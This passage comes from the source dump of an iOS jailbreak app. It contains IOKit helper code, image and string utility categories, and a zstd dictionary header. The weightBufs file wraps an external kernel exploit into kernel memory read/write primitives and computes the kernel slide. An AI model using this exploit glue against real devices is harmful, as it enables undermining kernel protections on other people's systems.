        kern_return_t kr = IOServiceOpen(service, mach_task_self(), type, &conn);
        if(kr != KERN_SUCCESS) {
                printf("[x] Could not open %s: %s\n",name,mach_error_string(kr));
                exit(-1);

        }
        return conn;
}


IOKit_args_t * allocate_args(uint32_t InSize,uint32_t OutSize,bool has_mp)
{
        IOKit_args_t *args = (IOKit_args_t *)calloc(sizeof(IOKit_args_t),1);
        args->sInput = (uint8_t *)calloc(InSize,1);
        args->sOutput = (uint8_t *)calloc(OutSize,1);

        args->sInputSize = InSize;
        args->sOutputSize = OutSize;

        if(has_mp) {
                mach_port_t mp = 0;
                if(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &mp))
                        assert(false);
                args->asyncAwake  = mp;
        }
        return args;
}

void destroy_args(IOKit_args_t *args)
{
        if(args->sInput) free(args->sInput);
        if(args->sOutput) free(args->sOutput);

        if(args->asyncAwake)
                ;//mach_port_destroy(mach_task_self(),args->asyncAwake);

        args->sInput = args->sOutput = NULL;
        free(args);


}


CFNumberRef CFInt32(int32_t value)
{
        return CFNumberCreate(NULL, kCFNumberSInt32Type, &value);
}

CFNumberRef CFInt64(int64_t value)
{
        return CFNumberCreate(NULL, kCFNumberSInt64Type, &value);
}


void hexdump(const void* data, size_t size)
{
        char ascii[17];
        size_t i, j;
        ascii[16] = '\0';
        for (i = 0; i < size; ++i) {
                printf("%02X ", ((unsigned char*)data)[i]);
                if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
                        ascii[i % 16] = ((unsigned char*)data)[i];
                } else
                        ascii[i % 16] = '.';

                if ((i+1) % 8 == 0 || i+1 == size) {
                        printf(" ");
                        if ((i+1) % 16 == 0)
                                printf("|  %s \n", ascii);
                        else if (i+1 == size) {
                                ascii[(i+1) % 16] = '\0';
                                if ((i+1) % 16 <= 8) {
                                        printf(" ");
                                }
                                for (j = (i+1) % 16; j < 16; ++j)
                                        printf("   ");

                                printf("|  %s \n", ascii);
                        }
                }
        }
}

```

`Application/Dopamine/Exploits/weightBufs/weightBufs.h`:

```h
//
//  weightBufs.h
//  weightBufs
//
//  Created by Lars Fröder on 27.04.24.
//

#import <Foundation/Foundation.h>

//! Project version number for weightBufs.
FOUNDATION_EXPORT double weightBufsVersionNumber;

//! Project version string for weightBufs.
FOUNDATION_EXPORT const unsigned char weightBufsVersionString[];

// In this header, you should import all the public headers of your framework using statements like #import <weightBufs/PublicHeader.h>



```

`Application/Dopamine/Exploits/weightBufs/weightBufs.m`:

```m
//
//  weightBufs.c
//  weightBufs
//
//  Created by Lars Fröder on 27.04.24.
//

#include <stdio.h>

#import <Foundation/Foundation.h>
#import <mach-o/loader.h>
#import <libjailbreak/primitives_external.h>
#import <libjailbreak/info.h>

@interface _ANEDeviceInfo : NSObject
+(NSString*)aneSubType;
@end
extern uint32_t subtypeToUse;
extern int exploit(uint64_t *kernelBaseOut);
extern void kwrite64(uint64_t address,uint64_t value);
extern uint32_t kread32(uint64_t address);
extern void cleanup(void);

#define kread_from_method(type, method)                                             \
    do {                                                                            \
        volatile type* type_base = (volatile type*)(uaddr);                         \
        uint64_t type_size = ((size) / (sizeof(type)));                                  \
        for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {         \
            type type_value = method(kaddr + (type_offset * sizeof(type)));    \
            type_base[type_offset] = type_value;                                    \
        }                                                                           \
    } while (0)

#define kwrite_from_method(type, method)                                       \
    do {                                                                       \
        volatile type* type_base = (volatile type*)(uaddr);                    \
        uint64_t type_size = ((size) / (sizeof(type)));                             \
        for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {    \
            type type_value = type_base[type_offset];                          \
            method( kaddr + (type_offset * sizeof(type)), type_value);     \
        }                                                                      \
    } while (0)

int kreadbuf(uint64_t kaddr, void* uaddr, size_t size)
{
    switch (size) {
        case sizeof(uint8_t): {
            uint32_t r = kread32(kaddr);
            *(uint8_t *)uaddr = (uint8_t)r;
            break;
        }
        case sizeof(uint16_t): {
            uint32_t r = kread32(kaddr);
            *(uint16_t *)uaddr = (uint16_t)r;
            break;
        }
        default:
            kread_from_method(uint32_t, kread32);
            break;
    }
    return 0;
}

int kwritebuf(uint64_t kaddr, const void* uaddr, size_t size)
{
    switch (size) {
        case sizeof(uint8_t): {
            uint8_t r[8] = { 0 };
            kreadbuf(kaddr, r, sizeof(r));
            r[0] = *(uint8_t *)uaddr;
            kwrite64(kaddr, *(uint64_t *)r);
            break;
        }
        case sizeof(uint16_t): {
            uint16_t r[4] = { 0 };
            kreadbuf(kaddr, r, sizeof(r));
            r[0] = *(uint16_t *)uaddr;
            kwrite64(kaddr, *(uint64_t *)r);
            break;
        }
        case sizeof(uint32_t): {
            uint32_t r[2] = { 0 };
            kreadbuf(kaddr, r, sizeof(r));
            r[0] = *(uint32_t *)uaddr;
            kwrite64(kaddr, *(uint64_t *)r);
            break;
        }
        default:
            kwrite_from_method(uint64_t, kwrite64);
            break;
    }
    return 0;
}

int getAneSubtype(void)
{
    NSBundle *appleNeuralEngineBundle = [NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AppleNeuralEngine.framework"];
    [appleNeuralEngineBundle load];
    Class _ANEDeviceInfoClass = NSClassFromString(@"_ANEDeviceInfo");
    
    NSURL* imagingNetworksURL = [NSURL fileURLWithPath:@"/System/Library/ImagingNetworks"];
    NSDirectoryEnumerator<NSURL*>* enumerator = [[NSFileManager defaultManager] enumeratorAtURL:imagingNetworksURL includingPropertiesForKeys:nil options:0 errorHandler:nil];
    NSURL* file;
    
    NSString* aneSubType = [_ANEDeviceInfoClass aneSubType].uppercaseString;
    while(file = [enumerator nextObject])
    {
        if([file.pathExtension isEqualToString:@"hwx"] && [file.lastPathComponent containsString:aneSubType])
        {
            struct mach_header header;
            FILE* f = fopen(file.fileSystemRepresentation, "r");
            if(!f) continue;
            fread(&header, sizeof(struct mach_header), 1, f);
            fclose(f);
            return header.cpusubtype;
        }
    }
    return -1;
}

int exploit_init(const char *flavor)
{
    int subtype = getAneSubtype();
    if (subtype == -1) return -1;
    
    subtypeToUse = subtype;
    uint64_t kernelbase = 0;
    int r = exploit(&kernelbase);
    if (r != 0) return r;
    
    gPrimitives.kwritebuf = kwritebuf;
    gPrimitives.kreadbuf = kreadbuf;
    gSystemInfo.kernelConstant.slide = kernelbase - kconstant(staticBase);
    
    return 0;
}

int exploit_deinit(void)
{
    if (gPrimitives.kreadbuf == kreadbuf) {
        gPrimitives.kreadbuf = NULL;
    }
    if (gPrimitives.kwritebuf == kwritebuf) {
        gPrimitives.kwritebuf = NULL;
    }
    
    cleanup();
    return 0;
}

```

`Application/Dopamine/Extensions/NSData+Hex.h`:

```h
//
//  UIImage+UIImage_Blur.h
//  Dopamine
//
//  Created by Lars Fröder on 01.10.23.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface NSData (Hex)

- (NSString *)hexString;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/Extensions/NSData+Hex.m`:

```m
//
//  UIImage+Blur.m
//  Dopamine
//
//  Created by Lars Fröder on 01.10.23.
//

#import <Foundation/Foundation.h>
#import "NSData+Hex.h"

@implementation NSData (Hex)

- (NSString *)hexString {
    const unsigned char *dataBuffer = (const unsigned char *)[self bytes];
    if (!dataBuffer) return [NSString string];

    NSUInteger dataLength = [self length];
    NSMutableString *hexString = [NSMutableString stringWithCapacity:(dataLength * 2)];

    for (int i = 0; i < dataLength; ++i) {
        [hexString appendFormat:@"%02lX", (unsigned long)dataBuffer[i]];
    }

    return hexString;
}

@end

```

`Application/Dopamine/Extensions/NSString+Version.h`:

```h
//
//  NSString+Version.h
//  Dopamine
//
//  Created by Lars Fröder on 12.06.24.
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@interface NSString (Version)

- (NSInteger)numericalVersionRepresentation;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/Extensions/NSString+Version.m`:

```m
//
//  NSString+Version.h
//  Dopamine
//
//  Created by Lars Fröder on 12.06.24.
//

#import <Foundation/Foundation.h>

@implementation NSString (Version)

- (NSInteger)numericalVersionRepresentation
{
    NSInteger numericalRepresentation = 0;

    NSArray *components = [self componentsSeparatedByCharactersInSet:[[NSCharacterSet decimalDigitCharacterSet] invertedSet]];
    while (components.count < 3)
        components = [components arrayByAddingObject:@"0"];

    numericalRepresentation |= [components[0] integerValue] << 16;
    numericalRepresentation |= [components[1] integerValue] << 8;
    numericalRepresentation |= [components[2] integerValue];
    return numericalRepresentation;
}

@end

```

`Application/Dopamine/Extensions/UIImage+Blur.h`:

```h
//
//  UIImage+UIImage_Blur.h
//  Dopamine
//
//  Created by Lars Fröder on 01.10.23.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface UIImage (Blur)

- (instancetype)imageWithBlur:(float)radius;
- (instancetype)imageWithHue:(float)hue;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/Extensions/UIImage+Blur.m`:

```m
//
//  UIImage+Blur.m
//  Dopamine
//
//  Created by Lars Fröder on 01.10.23.
//

#import <Foundation/Foundation.h>
#import "UIImage+Blur.h"
#import <CoreImage/CoreImage.h>

@implementation UIImage (Blur)

- (instancetype)imageWithBlur:(float)radius
{
    CIImage *ciImage = [CIImage imageWithCGImage:self.CGImage];
    CIFilter *filter = [CIFilter filterWithName:@"CIGaussianBlur"];
    [filter setDefaults];
    [filter setValue:[ciImage imageByClampingToExtent] forKey:kCIInputImageKey];
    [filter setValue:@(radius) forKey:kCIInputRadiusKey];
    
    CIImage *outputImage = [[filter outputImage] imageByCroppingToRect:[ciImage extent]];
    CIContext *context   = [CIContext contextWithOptions:nil];
    CGImageRef cgImg     = [context createCGImage:outputImage fromRect:[ciImage extent]];
    
    return [UIImage imageWithCGImage:cgImg];
}

- (instancetype)imageWithHue:(float)hue
{
    CIImage *ciImage = [CIImage imageWithCGImage:self.CGImage];
    CIFilter *filter = [CIFilter filterWithName:@"CIHueAdjust"];
    [filter setDefaults];
    [filter setValue:ciImage forKey:kCIInputImageKey];
    [filter setValue:@(hue) forKey:kCIInputAngleKey];
    
    CIImage *outputImage = [filter outputImage];
    CIContext *context   = [CIContext contextWithOptions:nil];
    CGImageRef cgImg     = [context createCGImage:outputImage fromRect:[ciImage extent]];
    
    return [UIImage imageWithCGImage:cgImg];
}

@end

```

`Application/Dopamine/Extensions/UIImage+JPEG2000.h`:

```h
#import <UIKit/UIKit.h>

@interface UIImage (JPEG2000)
- (NSData *)jp2DataWithCompressionQuality:(CGFloat)quality;
@end
```

`Application/Dopamine/Extensions/UIImage+JPEG2000.m`:

```m
#import <ImageIO/ImageIO.h>
#import <MobileCoreServices/MobileCoreServices.h>
#import <Foundation/Foundation.h>
#import "UIImage+JPEG2000.h"

@implementation UIImage (JPEG2000) 

- (NSData *)jp2DataWithCompressionQuality:(CGFloat)quality
{
	NSMutableData *data = [NSMutableData data];
	CGImageDestinationRef destination = CGImageDestinationCreateWithData((__bridge CFMutableDataRef)data, kUTTypeJPEG2000, 1, NULL);
	if (!destination) {
		return nil;
	}
	
	NSDictionary *options = @{
		(NSString *)kCGImageDestinationLossyCompressionQuality: @(quality)
	};
	
	CGImageDestinationAddImage(destination, self.CGImage, (__bridge CFDictionaryRef)options);
	if (!CGImageDestinationFinalize(destination)) {
		CFRelease(destination);
		return nil;
	}
	
	CFRelease(destination);
	return data;
}

@end
```

`Application/Dopamine/Headers/zdict.h`:

```h
/*
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 * All rights reserved.
 *
 * This source code is licensed under both the BSD-style license (found in the
 * LICENSE file in the root directory of this source tree) and the GPLv2 (found
 * in the COPYING file in the root directory of this source tree).
 * You may select, at your option, one of the above-listed licenses.
 */

#if defined (__cplusplus)
extern "C" {
#endif

#ifndef ZSTD_ZDICT_H
#define ZSTD_ZDICT_H

/*======  Dependencies  ======*/
#include <stddef.h>  /* size_t */


/* =====   ZDICTLIB_API : control library symbols visibility   ===== */
#ifndef ZDICTLIB_VISIBLE
   /* Backwards compatibility with old macro name */
#  ifdef ZDICTLIB_VISIBILITY
#    define ZDICTLIB_VISIBLE ZDICTLIB_VISIBILITY
#  elif defined(__GNUC__) && (__GNUC__ >= 4) && !defined(__MINGW32__)
#    define ZDICTLIB_VISIBLE __attribute__ ((visibility ("default")))
#  else
#    define ZDICTLIB_VISIBLE
#  endif
#endif

#ifndef ZDICTLIB_HIDDEN
#  if defined(__GNUC__) && (__GNUC__ >= 4) && !defined(__MINGW32__)
#    define ZDICTLIB_HIDDEN __attribute__ ((visibility ("hidden")))
#  else
#    define ZDICTLIB_HIDDEN
#  endif
#endif

#if defined(ZSTD_DLL_EXPORT) && (ZSTD_DLL_EXPORT==1)
#  define ZDICTLIB_API __declspec(dllexport) ZDICTLIB_VISIBLE
#elif defined(ZSTD_DLL_IMPORT) && (ZSTD_DLL_IMPORT==1)
#  define ZDICTLIB_API __declspec(dllimport) ZDICTLIB_VISIBLE /* It isn't required but allows to generate better code, saving a function pointer load from the IAT and an indirect jump.*/
#else
#  define ZDICTLIB_API ZDICTLIB_VISIBLE
#endif

/*******************************************************************************
 * Zstd dictionary builder
 *
 * FAQ
 * ===
 * Why should I use a dictionary?
 * ------------------------------
 *
 * Zstd can use dictionaries to improve compression ratio of small data.
 * Traditionally small files don't compress well because there is very little
 * repetition in a single sample, since it is small. But, if you are compressing
 * many similar files, like a bunch of JSON records that share the same
 * structure, you can train a dictionary on ahead of time on some samples of
 * these files. Then, zstd can use the dictionary to find repetitions that are
 * present across samples. This can vastly improve compression ratio.
 *
 * When is a dictionary useful?
 * ----------------------------
 *
 * Dictionaries are useful when compressing many small files that are similar.
 * The larger a file is, the less benefit a dictionary will have. Generally,
 * we don't expect dictionary compression to be effective past 100KB. And the
 * smaller a file is, the more we would expect the dictionary to help.
 *
 * How do I use a dictionary?
 * --------------------------
 *
 * Simply pass the dictionary to the zstd compressor with
 * `ZSTD_CCtx_loadDictionary()`. The same dictionary must then be passed to
 * the decompressor, using `ZSTD_DCtx_loadDictionary()`. There are other
 * more advanced functions that allow selecting some options, see zstd.h for
 * complete documentation.
 *
 * What is a zstd dictionary?
 * --------------------------
 *
 * A zstd dictionary has two pieces: Its header, and its content. The header
 * contains a magic number, the dictionary ID, and entropy tables. These
 * entropy tables allow zstd to save on header costs in the compressed file,
 * which really matters for small data. The content is just bytes, which are
 * repeated content that is common across many samples.
 *
 * What is a raw content dictionary?
 * ---------------------------------
 *
 * A raw content dictionary is just bytes. It doesn't have a zstd dictionary
 * header, a dictionary ID, or entropy tables. Any buffer is a valid raw
 * content dictionary.
 *
 * How do I train a dictionary?
 * ----------------------------
 *
 * Gather samples from your use case. These samples should be similar to each
 * other. If you have several use cases, you could try to train one dictionary
 * per use case.
 *
 * Pass those samples to `ZDICT_trainFromBuffer()` and that will train your
 * dictionary. There are a few advanced versions of this function, but this
 * is a great starting point. If you want to further tune your dictionary
 * you could try `ZDICT_optimizeTrainFromBuffer_cover()`. If that is too slow
 * you can try `ZDICT_optimizeTrainFromBuffer_fastCover()`.
 *
 * If the dictionary training function fails, that is likely because you
 * either passed too few samples, or a dictionary would not be effective
 * for your data. Look at the messages that the dictionary trainer printed,
 * if it doesn't say too few samples, then a dictionary would not be effective.
 *
 * How large should my dictionary be?
 * ----------------------------------
 *
 * A reasonable dictionary size, the `dictBufferCapacity`, is about 100KB.
 * The zstd CLI defaults to a 110KB dictionary. You likely don't need a
 * dictionary larger than that. But, most use cases can get away with a
 * smaller dictionary. The advanced dictionary builders can automatically
 * shrink the dictionary for you, and select the smallest size that doesn't
 * hurt compression ratio too much. See the `shrinkDict` parameter.
 * A smaller dictionary can save memory, and potentially speed up
 * compression.
 *
 * How many samples should I provide to the dictionary builder?
 * ------------------------------------------------------------
 *
 * We generally recommend passing ~100x the size of the dictionary
 * in samples. A few thousand should suffice. Having too few samples
 * can hurt the dictionaries effectiveness. Having more samples will
 * only improve the dictionaries effectiveness. But having too many
 * samples can slow down the dictionary builder.
 *
 * How do I determine if a dictionary will be effective?
 * -----------------------------------------------------
 *
 * Simply train a dictionary and try it out. You can use zstd's built in
 * benchmarking tool to test the dictionary effectiveness.
 *
 *   # Benchmark levels 1-3 without a dictionary
 *   zstd -b1e3 -r /path/to/my/files
 *   # Benchmark levels 1-3 with a dictionary
 *   zstd -b1e3 -r /path/to/my/files -D /path/to/my/dictionary
 *
 * When should I retrain a dictionary?
 * -----------------------------------
 *
 * You should retrain a dictionary when its effectiveness drops. Dictionary
 * effectiveness drops as the data you are compressing changes. Generally, we do
 * expect dictionaries to "decay" over time, as your data changes, but the rate
 * at which they decay depends on your use case. Internally, we regularly
 * retrain dictionaries, and if the new dictionary performs significantly
 * better than the old dictionary, we will ship the new dictionary.
 *
 * I have a raw content dictionary, how do I turn it into a zstd dictionary?
 * -------------------------------------------------------------------------
 *
 * If you have a raw content dictionary, e.g. by manually constructing it, or
 * using a third-party dictionary builder, you can turn it into a zstd
 * dictionary by using `ZDICT_finalizeDictionary()`. You'll also have to
 * provide some samples of the data. It will add the zstd header to the
 * raw content, which contains a dictionary ID and entropy tables, which
 * will improve compression ratio, and allow zstd to write the dictionary ID
 * into the frame, if you so choose.
 *
 * Do I have to use zstd's dictionary builder?
 * -------------------------------------------
 *
 * No! You can construct dictionary content however you please, it is just
 * bytes. It will always be valid as a raw content dictionary. If you want
 * a zstd dictionary, which can improve compression ratio, use
 * `ZDICT_finalizeDictionary()`.
 *
 * What is the attack surface of a zstd dictionary?
 * ------------------------------------------------
 *
 * Zstd is heavily fuzz tested, including loading fuzzed dictionaries, so
 * zstd should never crash, or access out-of-bounds memory no matter what
 * the dictionary is. However, if an attacker can control the dictionary
 * during decompression, they can cause zstd to generate arbitrary bytes,
 * just like if they controlled the compressed data.
 *
 ******************************************************************************/


/*! ZDICT_trainFromBuffer():
 *  Train a dictionary from an array of samples.
 *  Redirect towards ZDICT_optimizeTrainFromBuffer_fastCover() single-threaded, with d=8, steps=4,
 *  f=20, and accel=1.
 *  Samples must be stored concatenated in a single flat buffer `samplesBuffer`,
 *  supplied with an array of sizes `samplesSizes`, providing the size of each sample, in order.
 *  The resulting dictionary will be saved into `dictBuffer`.
 * @return: size of dictionary stored into `dictBuffer` (<= `dictBufferCapacity`)
 *          or an error code, which can be tested with ZDICT_isError().
 *  Note:  Dictionary training will fail if there are not enough samples to construct a
 *         dictionary, or if most of the samples are too small (< 8 bytes being the lower limit).
 *         If dictionary training fails, you should use zstd without a dictionary, as the dictionary
 *         would've been ineffective anyways. If you believe your samples would benefit from a dictionary
 *         please open an issue with details, and we can look into it.
 *  Note: ZDICT_trainFromBuffer()'s memory usage is about 6 MB.
 *  Tips: In general, a reasonable dictionary has a size of ~ 100 KB.
 *        It's possible to select smaller or larger size, just by specifying `dictBufferCapacity`.
 *        In general, it's recommended to provide a few thousands samples, though this can vary a lot.
 *        It's recommended that total size of all samples be about ~x100 times the target size of dictionary.
 */
ZDICTLIB_API size_t ZDICT_trainFromBuffer(void* dictBuffer, size_t dictBufferCapacity,
                                    const void* samplesBuffer,
                                    const size_t* samplesSizes, unsigned nbSamples);

typedef struct {
    int      compressionLevel;   /**< optimize for a specific zstd compression level; 0 means default */
    unsigned notificationLevel;  /**< Write log to stderr; 0 = none (default); 1 = errors; 2 = progression; 3 = details; 4 = debug; */
    unsigned dictID;             /**< force dictID value; 0 means auto mode (32-bits random value)
                                  *   NOTE: The zstd format reserves some dictionary IDs for future use.
                                  *         You may use them in private settings, but be warned that they
                                  *         may be used by zstd in a public dictionary registry in the future.
                                  *         These dictionary IDs are:
                                  *           - low range  : <= 32767
                                  *           - high range : >= (2^31)
                                  */
} ZDICT_params_t;

/*! ZDICT_finalizeDictionary():
 * Given a custom content as a basis for dictionary, and a set of samples,
 * finalize dictionary by adding headers and statistics according to the zstd
 * dictionary format.
 *
 * Samples must be stored concatenated in a flat buffer `samplesBuffer`,
 * supplied with an array of sizes `samplesSizes`, providing the size of each
 * sample in order. The samples are used to construct the statistics, so they
 * should be representative of what you will compress with this dictionary.
 *
 * The compression level can be set in `parameters`. You should pass the
 * compression level you expect to use in production. The statistics for each
 * compression level differ, so tuning the dictionary for the compression level
 * can help quite a bit.
 *
 * You can set an explicit dictionary ID in `parameters`, or allow us to pick
 * a random dictionary ID for you, but we can't guarantee no collisions.
 *
 * The dstDictBuffer and the dictContent may overlap, and the content will be
 * appended to the end of the header. If the header + the content doesn't fit in
 * maxDictSize the beginning of the content is truncated to make room, since it
 * is presumed that the most profitable content is at the end of the dictionary,
 * since that is the cheapest to reference.
 *
 * `maxDictSize` must be >= max(dictContentSize, ZSTD_DICTSIZE_MIN).
 *
 * @return: size of dictionary stored into `dstDictBuffer` (<= `maxDictSize`),
 *          or an error code, which can be tested by ZDICT_isError().
 * Note: ZDICT_finalizeDictionary() will push notifications into stderr if
 *       instructed to, using notificationLevel>0.
 * NOTE: This function currently may fail in several edge cases including:
 *         * Not enough samples
 *         * Samples are uncompressible
 *         * Samples are all exactly the same
 */
ZDICTLIB_API size_t ZDICT_finalizeDictionary(void* dstDictBuffer, size_t maxDictSize,
                                const void* dictContent, size_t dictContentSize,
                                const void* samplesBuffer, const size_t* samplesSizes, unsigned nbSamples,
                                ZDICT_params_t parameters);


/*======   Helper functions   ======*/
ZDICTLIB_API unsigned ZDICT_getDictID(const void* dictBuffer, size_t dictSize);  /**< extracts dictID; @return zero if error (not a valid dictionary) */
ZDICTLIB_API size_t ZDICT_getDictHeaderSize(const void* dictBuffer, size_t dictSize);  /* returns dict header size; returns a ZSTD error code on failure */
ZDICTLIB_API unsigned ZDICT_isError(size_t errorCode);
ZDICTLIB_API const char* ZDICT_getErrorName(size_t errorCode);

#endif   /* ZSTD_ZDICT_H */

#if defined(ZDICT_STATIC_LINKING_ONLY) && !defined(ZSTD_ZDICT_H_STATIC)
#define ZSTD_ZDICT_H_STATIC

/* This can be overridden externally to hide static symbols. */
#ifndef ZDICTLIB_STATIC_API
#  if defined(ZSTD_DLL_EXPORT) && (ZSTD_DLL_EXPORT==1)
#    define ZDICTLIB_STATIC_API __declspec(dllexport) ZDICTLIB_VISIBLE
#  elif defined(ZSTD_DLL_IMPORT) && (ZSTD_DLL_IMPORT==1)
#    define ZDICTLIB_STATIC_API __declspec(dllimport) ZDICTLIB_VISIBLE
#  else
#    define ZDICTLIB_STATIC_API ZDICTLIB_VISIBLE
#  endif
#endif

/* ====================================================================================
 * The definitions in this section are considered experimental.
 * They should never be used with a dynamic library, as they may change in the future.
 * They are provided for advanced usages.
 * Use them only in association with static linking.
 * ==================================================================================== */

#define ZDICT_DICTSIZE_MIN    256
/* Deprecated: Remove in v1.6.0 */
#define ZDICT_CONTENTSIZE_MIN 128

/*! ZDICT_cover_params_t:
 *  k and d are the only required parameters.
 *  For others, value 0 means default.
 */
typedef struct {
    unsigned k;                  /* Segment size : constraint: 0 < k : Reasonable range [16, 2048+] */
    unsigned d;                  /* dmer size : constraint: 0 < d <= k : Reasonable range [6, 16] */
    unsigned steps;              /* Number of steps : Only used for optimization : 0 means default (40) : Higher means more parameters checked */
    unsigned nbThreads;          /* Number of threads : constraint: 0 < nbThreads : 1 means single-threaded : Only used for optimization : Ignored if ZSTD_MULTITHREAD is not defined */
    double splitPoint;           /* Percentage of samples used for training: Only used for optimization : the first nbSamples * splitPoint samples will be used to training, the last nbSamples * (1 - splitPoint) samples will be used for testing, 0 means default (1.0), 1.0 when all samples are used for both training and testing */
    unsigned shrinkDict;         /* Train dictionaries to shrink in size starting from the minimum size and selects the smallest dictionary that is shrinkDictMaxRegression% worse than the largest dictionary. 0 means no shrinking and 1 means shrinking  */
    unsigned shrinkDictMaxRegression; /* Sets shrinkDictMaxRegression so that a smaller dictionary can be at worse shrinkDictMaxRegression% worse than the max dict size dictionary. */
    ZDICT_params_t zParams;
} ZDICT_cover_params_t;

typedef struct {
    unsigned k;                  /* Segment size : constraint: 0 < k : Reasonable range [16, 2048+] */
    unsigned d;                  /* dmer size : constraint: 0 < d <= k : Reasonable range [6, 16] */
    unsigned f;                  /* log of size of frequency array : constraint: 0 < f <= 31 : 1 means default(20)*/
    unsigned steps;              /* Number of steps : Only used for optimization : 0 means default (40) : Higher means more parameters checked */
    unsigned nbThreads;          /* Number of threads : constraint: 0 < nbThreads : 1 means single-threaded : Only used for optimization : Ignored if ZSTD_MULTITHREAD is not defined */
    double splitPoint;           /* Percentage of samples used for training: Only used for optimization : the first nbSamples * splitPoint samples will be used to training, the last nbSamples * (1 - splitPoint) samples will be used for testing, 0 means default (0.75), 1.0 when all samples are used for both training and testing */
    unsigned accel;              /* Acceleration level: constraint: 0 < accel <= 10, higher means faster and less accurate, 0 means default(1) */
    unsigned shrinkDict;         /* Train dictionaries to shrink in size starting from the minimum size and selects the smallest dictionary that is shrinkDictMaxRegression% worse than the largest dictionary. 0 means no shrinking and 1 means shrinking  */
    unsigned shrinkDictMaxRegression; /* Sets shrinkDictMaxRegression so that a smaller dictionary can be at worse shrinkDictMaxRegression% worse than the max dict size dictionary. */

    ZDICT_params_t zParams;
} ZDICT_fastCover_params_t;

/*! ZDICT_trainFromBuffer_cover():
 *  Train a dictionary from an array of samples using the COVER algorithm.
 *  Samples must be stored concatenated in a single flat buffer `samplesBuffer`,
 *  supplied with an array of sizes `samplesSizes`, providing the size of each sample, in order.
 *  The resulting dictionary will be saved into `dictBuffer`.
 * @return: size of dictionary stored into `dictBuffer` (<= `dictBufferCapacity`)
 *          or an error code, which can be tested with ZDICT_isError().
 *          See ZDICT_trainFromBuffer() for details on failure modes.
 *  Note: ZDICT_trainFromBuffer_cover() requires about 9 bytes of memory for each input byte.
 *  Tips: In general, a reasonable dictionary has a size of ~ 100 KB.
 *        It's possible to select smaller or larger size, just by specifying `dictBufferCapacity`.
 *        In general, it's recommended to provide a few thousands samples, though this can vary a lot.
 *        It's recommended that total size of all samples be about ~x100 times the target size of dictionary.
 */
ZDICTLIB_STATIC_API size_t ZDICT_trainFromBuffer_cover(
          void *dictBuffer, size_t dictBufferCapacity,
    const void *samplesBuffer, const size_t *samplesSizes, unsigned nbSamples,
          ZDICT_cover_params_t parameters);

/*! ZDICT_optimizeTrainFromBuffer_cover():
 * The same requirements as above hold for all the parameters except `parameters`.
 * This function tries many parameter combinations and picks the best parameters.
 * `*parameters` is filled with the best parameters found,
 * dictionary constructed with those parameters is stored in `dictBuffer`.
 *
 * All of the parameters d, k, steps are optional.
 * If d is non-zero then we don't check multiple values of d, otherwise we check d = {6, 8}.
 * if steps is zero it defaults to its default value.
 * If k is non-zero then we don't check multiple values of k, otherwise we check steps values in [50, 2000].
 *
 * @return: size of dictionary stored into `dictBuffer` (<= `dictBufferCapacity`)
 *          or an error code, which can be tested with ZDICT_isError().
 *          On success `*parameters` contains the parameters selected.
 *          See ZDICT_trainFromBuffer() for details on failure modes.
 * Note: ZDICT_optimizeTrainFromBuffer_cover() requires about 8 bytes of memory for each input byte and additionally another 5 bytes of memory for each byte of memory for each thread.
 */
ZDICTLIB_STATIC_API size_t ZDICT_optimizeTrainFromBuffer_cover(
          void* dictBuffer, size_t dictBufferCapacity,
    const void* samplesBuffer, const size_t* samplesSizes, unsigned nbSamples,
          ZDICT_cover_params_t* parameters);

/*! ZDICT_trainFromBuffer_fastCover():
 *  Train a dictionary from an array of samples using a modified version of COVER algorithm.
 *  Samples must be stored concatenated in a single flat buffer `samplesBuffer`,
 *  supplied with an array of sizes `samplesSizes`, providing the size of each sample, in order.
 *  d and k are required.
 *  All other parameters are optional, will use default values if not provided
 *  The resulting dictionary will be saved into `dictBuffer`.
 * @return: size of dictionary stored into `dictBuffer` (<= `dictBufferCapacity`)
 *          or an error code, which can be tested with ZDICT_isError().
 *          See ZDICT_trainFromBuffer() for details on failure modes.
 *  Note: ZDICT_trainFromBuffer_fastCover() requires 6 * 2^f bytes of memory.
 *  Tips: In general, a reasonable dictionary has a size of ~ 100 KB.
 *        It's possible to select smaller or larger size, just by specifying `dictBufferCapacity`.
 *        In general, it's recommended to provide a few thousands samples, though this can vary a lot.
 *        It's recommended that total size of all samples be about ~x100 times the target size of dictionary.
 */
ZDICTLIB_STATIC_API size_t ZDICT_trainFromBuffer_fastCover(void *dictBuffer,
                    size_t dictBufferCapacity, const void *samplesBuffer,
                    const size_t *samplesSizes, unsigned nbSamples,
                    ZDICT_fastCover_params_t parameters);

/*! ZDICT_optimizeTrainFromBuffer_fastCover():
 * The same requirements as above hold for all the parameters except `parameters`.
 * This function tries many parameter combinations (specifically, k and d combinations)
 * and picks the best parameters. `*parameters` is filled with the best parameters found,
 * dictionary constructed with those parameters is stored in `dictBuffer`.
 * All of the parameters d, k, steps, f, and accel are optional.
 * If d is non-zero then we don't check multiple values of d, otherwise we check d = {6, 8}.
 * if steps is zero it defaults to its default value.
 * If k is non-zero then we don't check multiple values of k, otherwise we check steps values in [50, 2000].
 * If f is zero, default value of 20 is used.
 * If accel is zero, default value of 1 is used.
 *
 * @return: size of dictionary stored into `dictBuffer` (<= `dictBufferCapacity`)
 *          or an error code, which can be tested with ZDICT_isError().
 *          On success `*parameters` contains the parameters selected.
 *          See ZDICT_trainFromBuffer() for details on failure modes.
 * Note: ZDICT_optimizeTrainFromBuffer_fastCover() requires about 6 * 2^f bytes of memory for each thread.
 */
ZDICTLIB_STATIC_API size_t ZDICT_optimizeTrainFromBuffer_fastCover(void* dictBuffer,
                    size_t dictBufferCapacity, const void* samplesBuffer,
                    const size_t* samplesSizes, unsigned nbSamples,
                    ZDICT_fastCover_params_t* parameters);

typedef struct {
    unsigned selectivityLevel;   /* 0 means default; larger => select more => larger dictionary */
    ZDICT_params_t zParams;
} ZDICT_legacy_params_t;

